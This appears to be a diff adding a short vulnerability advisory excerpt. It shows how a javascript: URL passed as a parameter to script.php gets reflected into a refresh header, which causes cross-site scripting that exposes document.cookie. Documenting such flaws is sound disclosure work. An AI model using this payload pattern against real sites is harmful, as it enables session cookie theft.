@@ -1,0 +1,7 @@
+With request to script at web site:
+
+http://www.example.com/script.php?param=javascript:alert(document.cookie)
+
+Which returns in answer the refresh header:
+
+refresh: 0; URL=javascript:alert(document.cookie)
